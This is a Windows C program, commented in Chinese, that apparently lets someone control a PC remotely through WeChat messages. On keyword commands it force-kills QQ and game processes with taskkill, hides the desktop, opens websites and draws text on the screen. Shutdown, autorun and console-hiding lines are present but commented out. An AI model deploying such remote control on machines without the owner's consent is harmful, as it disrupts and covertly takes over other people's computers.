
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

#include <stdio.h>
#include <windows.h>
#include "itmojun.h"//包含头文件，这个头文件在当前工程目录下，所以用双引号包含

#pragma comment(lib,"itmojun.lib")//连接静态库
#pragma comment(lib,"winmm.lib")

int iShowText=0;//用来控制显示字幕为零就赢藏字幕，非零就显示字幕就
int iMessageBox=0;//用来控制消息框0为不显示非0为显示

DWORD WINAPI ShowTextThr(LPVOID IpPara);  //字幕方法
DWORD WINAPI MessageBoxThr(LPVOID IpPara);//消息框方法

int main()
{
	HANDLE hTextThr=NULL;
	HANDLE hMessageThr = NULL;

	char msg[301];//用于存放微信端发送的数据
	system("color f4");
//	AutoRun();//自动运行

	//创建线程 用于显示字幕
	hTextThr=CreateThread(NULL,0,ShowTextThr,NULL,0,NULL);
	//关闭句柄
	CloseHandle(hTextThr);

	//创建线程 用于控制消息框
	hMessageThr=CreateThread(NULL,0,MessageBoxThr,NULL,0,NULL);
	//关闭句柄
	CloseHandle(hMessageThr);


	while(1)
	{
		 
		GetPCCmd("cui",msg);//接收微信端发送给ID为xxy的数据，并存放在msg中  （通过微信工作号：IT魔君  输入：急急如律令 打开连接，芝麻关门 断开连接。）
		printf("%s\n",msg);
		if(strstr(msg,"播放"))
		{
			mciSendString("play bg.mp3",NULL,0,NULL);
		}
		else if(strstr(msg,"停止"))
		{
			mciSendString("stop bg.mp3",NULL,0,NULL);
		}
		else if(strstr(msg,"暂停"))
		{
			mciSendString("pause bg.mp3",NULL,0,NULL);
		}

		else if(strstr(msg,"关机"))
		{
			//WinExec("shutdown -s -t 0",0);//让电脑关机
		}
		else if(strstr(msg,"重启"))
		{
			//WinExec("shutdown -r -t 0",0);//让电脑重启
		}

		else if(strstr(msg,"杀QQ"))
		{
			WinExec("cmd /C taskkill /f /im qq.exe",0);//关闭QQ
		}
		else if(strstr(msg,"英雄联盟"))
		{
			WinExec("cmd /C taskkill /f /im client.exe",0);//关闭英雄联盟
		}

		else if(strstr(msg,"隐藏桌面"))
		{
			//WinExec("cmd /C taskkill /f /im explorer.exe",0);
			//1.找到窗口
			//2.结束窗口

			HWND desktop,taskker;
			desktop = FindWindow("ProgMan",NULL);//找到桌面句柄
			taskker = FindWindow("Shell_TrayWnd",NULL);//找到任务栏句柄
		
			ShowWindow(desktop,SW_HIDE);//隐藏桌面窗口
			ShowWindow(desktop,SW_HIDE);//隐藏任务栏
		}
		else if(strstr(msg,"显示桌面"))
		{
			//WinExec("C:\\windows\\explorer.exe",1);//不适用于win10系统
			HWND desktop,taskker;
			desktop = FindWindow("ProgMan",NULL);//找到桌面句柄
			taskker = FindWindow("Shell_TrayWnd",NULL);//找到任务栏句柄
		
			ShowWindow(desktop,SW_SHOW);//显示桌面窗口
			ShowWindow(desktop,SW_SHOW);//显示任务栏
		}

		else if(strstr(msg,"百度"))
		{
			WinExec("explorer http://www.baidu.com",1);
		}
		else if(strstr(msg,"淘宝"))
		{
			WinExec("explorer http://www.taobao.com",1);
		}

		else if(strstr(msg,"显示字幕"))
		{
			//在桌面上显示一句话 通过线程解决
			iShowText=1;
		}
		else if(strstr(msg,"关闭字幕"))
		{
			iShowText=0;
		}

		else if(strstr(msg,"弹出消息框"))
		{
			//在桌面上显示一句话 通过线程解决
			iMessageBox=1;
		}
		else if(strstr(msg,"隐藏消息框"))
		{
			iMessageBox=0;
		}
		Sleep(3000);

	}

	return 0;
}

DWORD WINAPI ShowTextThr(LPVOID IpPara)
{
	HFONT hFont=CreateFont(100,50,0,0,FW_THIN,0,0,0,ANSI_CHARSET,
		OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,
		DEFAULT_PITCH | FF_SWISS,"宋体");
	
	HFONT hOldFont;
	HDC hdc;
	
	const char*ShowText = "到此一游";

	while(1)
	{
		if(iShowText!=0)//来控制显示字幕
		{
			//显示字幕
			//printf("显示字幕dadada\n");
			hdc = GetDC(NULL);
			SetBkMode(hdc,TRANSPARENT);
			SetTextColor(hdc,RGB(0,255,0));//设置背景色
			hOldFont=(HFONT)SelectObject(hdc,hFont);//显示到窗口
			TextOut(hdc,50,50,ShowText,strlen(ShowText));//字体输出
			SelectObject(hdc,hOldFont);
			ReleaseDC(NULL,hdc);
		}
		Sleep(1000);
	}
}

DWORD WINAPI MessageBoxThr(LPVOID IpPara)
{
	while(1)
	{
		if(iMessageBox==1)
		{
			//显示消息框
			MessageBox(NULL,"你好！世界！","温馨提示",MB_OKCANCEL | MB_ICONWARNING);

		}else
		{
			Sleep(1000);
		}
	}
}
